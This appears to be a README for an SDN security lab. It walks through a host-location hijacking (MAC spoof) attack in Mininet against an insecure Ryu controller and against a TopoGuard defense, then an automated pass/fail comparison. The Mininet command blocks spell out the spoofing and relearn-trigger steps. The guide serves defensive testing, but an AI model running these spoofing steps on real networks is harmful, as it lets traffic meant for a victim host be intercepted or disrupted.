# Host Location Hijacking Attack Test (Manual First)

This guide shows how to run the same host-location hijacking (MAC move spoof) attack manually against:

1. `insecure_baseline_ryu.py` (expected to be vulnerable)
2. `topoguard_ryu.py` (expected to defend)

At the end, you can run `hlh_auto.py` to automate the same A/B test.

## Test Setup

Use two terminals from `topoguard-ryu`:

- Terminal A: controller (`ryu-manager ...`)
- Terminal B: Mininet (`sudo python3 topology.py`)

Topology used:

- `h1`, `h2` on `s1`
- `h3` on `s2`
- Victim identity is `h2` (`10.0.0.2`, `00:00:00:00:00:02`)
- Attack source is `h1` (spoofs victim MAC)

## 1) Manual Test on Insecure Baseline

### Terminal A (controller)

```bash
ryu-manager insecure_baseline_ryu.py
```

### Terminal B (Mininet)

```bash
sudo python3 topology.py
```

Inside Mininet CLI, run:

```bash
# Warm up host learning and pin victim mapping at traffic source
h2 ping -c 2 10.0.0.3
h3 arp -s 10.0.0.2 00:00:00:00:00:02
h3 ping -c 2 10.0.0.2

# Clear dataplane flows for deterministic pre-check
sh ovs-ofctl -O OpenFlow13 del-flows s1
sh ovs-ofctl -O OpenFlow13 del-flows s2
sh ovs-ofctl -O OpenFlow13 add-flow s1 "priority=0,actions=CONTROLLER:65535"
sh ovs-ofctl -O OpenFlow13 add-flow s2 "priority=0,actions=CONTROLLER:65535"

# Pre-attack check
h3 ping -c 2 10.0.0.2
h3 ping -c 1 10.0.0.2
sh ovs-ofctl -O OpenFlow13 dump-flows s1 | grep "dl_dst=00:00:00:00:00:02"

# Host-location hijack: h1 spoofs h2 MAC
h1 ip link set dev h1-eth0 down
h1 ip link set dev h1-eth0 address 00:00:00:00:00:02
h1 ip link set dev h1-eth0 up

# Deterministic relearn trigger (matches hlh_auto.py)
sh ovs-ofctl -O OpenFlow13 del-flows s1
sh ovs-ofctl -O OpenFlow13 del-flows s2
sh ovs-ofctl -O OpenFlow13 add-flow s1 "priority=0,actions=CONTROLLER:65535"
sh ovs-ofctl -O OpenFlow13 add-flow s2 "priority=0,actions=CONTROLLER:65535"
h1 ip neigh flush all
h1 ping -c 5 -i 0.05 -W 1 10.0.0.254
h1 arp -s 10.0.0.3 00:00:00:00:00:03
h1 ping -c 8 -i 0.05 -W 1 10.0.0.3

# Recompute and post-attack checks
sh ovs-ofctl -O OpenFlow13 del-flows s1
sh ovs-ofctl -O OpenFlow13 del-flows s2
sh ovs-ofctl -O OpenFlow13 add-flow s1 "priority=0,actions=CONTROLLER:65535"
sh ovs-ofctl -O OpenFlow13 add-flow s2 "priority=0,actions=CONTROLLER:65535"
h3 ping -c 3 10.0.0.2
h3 ping -c 1 10.0.0.2
sh ovs-ofctl -O OpenFlow13 dump-flows s1 | grep "dl_dst=00:00:00:00:00:02"
```

### Expected Output (Baseline)

- `pre` (before attack): low packet loss (usually `0%`).
- `post` (after attack): flow output for `dl_dst=00:00:00:00:00:02` on `s1` can include attacker-side port, and/or reachability degrades.
- Baseline controller log does not report TopoGuard host-move violations.

Exit Mininet with `exit`, then clean up before the next run:

```bash
sudo mn -c
```

Stop the controller in Terminal A with `Ctrl+C`.

## 2) Manual Test on TopoGuard

### Terminal A (controller)

```bash
ryu-manager topoguard_ryu.py
```

### Terminal B (Mininet)

```bash
sudo python3 topology.py
```

Inside Mininet CLI, run the same sequence:

```bash
# Warm up host learning and pin victim mapping
h2 ping -c 2 10.0.0.3
h3 arp -s 10.0.0.2 00:00:00:00:00:02
h3 ping -c 2 10.0.0.2

# Clear dataplane flows for deterministic pre-check
sh ovs-ofctl -O OpenFlow13 del-flows s1
sh ovs-ofctl -O OpenFlow13 del-flows s2
sh ovs-ofctl -O OpenFlow13 add-flow s1 "priority=0,actions=CONTROLLER:65535"
sh ovs-ofctl -O OpenFlow13 add-flow s2 "priority=0,actions=CONTROLLER:65535"

# Pre-attack check
h3 ping -c 2 10.0.0.2
h3 ping -c 1 10.0.0.2
sh ovs-ofctl -O OpenFlow13 dump-flows s1 | grep "dl_dst=00:00:00:00:00:02"

# Same host-location hijack attempt
h1 ip link set dev h1-eth0 down
h1 ip link set dev h1-eth0 address 00:00:00:00:00:02
h1 ip link set dev h1-eth0 up
sh ovs-ofctl -O OpenFlow13 del-flows s1
sh ovs-ofctl -O OpenFlow13 del-flows s2
sh ovs-ofctl -O OpenFlow13 add-flow s1 "priority=0,actions=CONTROLLER:65535"
sh ovs-ofctl -O OpenFlow13 add-flow s2 "priority=0,actions=CONTROLLER:65535"
h1 ip neigh flush all
h1 ping -c 5 -i 0.05 -W 1 10.0.0.254
h1 arp -s 10.0.0.3 00:00:00:00:00:03
h1 ping -c 8 -i 0.05 -W 1 10.0.0.3

# Recompute and post-attack checks
sh ovs-ofctl -O OpenFlow13 del-flows s1
sh ovs-ofctl -O OpenFlow13 del-flows s2
sh ovs-ofctl -O OpenFlow13 add-flow s1 "priority=0,actions=CONTROLLER:65535"
sh ovs-ofctl -O OpenFlow13 add-flow s2 "priority=0,actions=CONTROLLER:65535"
h3 ping -c 3 10.0.0.2
h3 ping -c 1 10.0.0.2
sh ovs-ofctl -O OpenFlow13 dump-flows s1 | grep "dl_dst=00:00:00:00:00:02"
```

### Expected Output (TopoGuard)

- `pre` (before attack): low packet loss (usually `0%`).
- `post` (after attack): victim reachability remains low-loss and `s1` flow output for victim MAC stays on victim-side path.
- Controller log records host-move violation, for example:

```text
Violation: Host Move from switch ... port ... without Port ShutDown
```

## 3) Automatic A/B Test

After the manual runs above, you can execute the automated comparison:

```bash
sudo python3 hlh_auto.py
```

It prints:

- baseline `pre`/`post` packet-loss percentages
- baseline `pre_outputs`/`post_outputs` for victim MAC flow on `s1`
- topoguard `pre`/`post` packet-loss percentages
- topoguard `pre_outputs`/`post_outputs` and host-move violation detection
- final `result=PASS` or `result=FAIL`
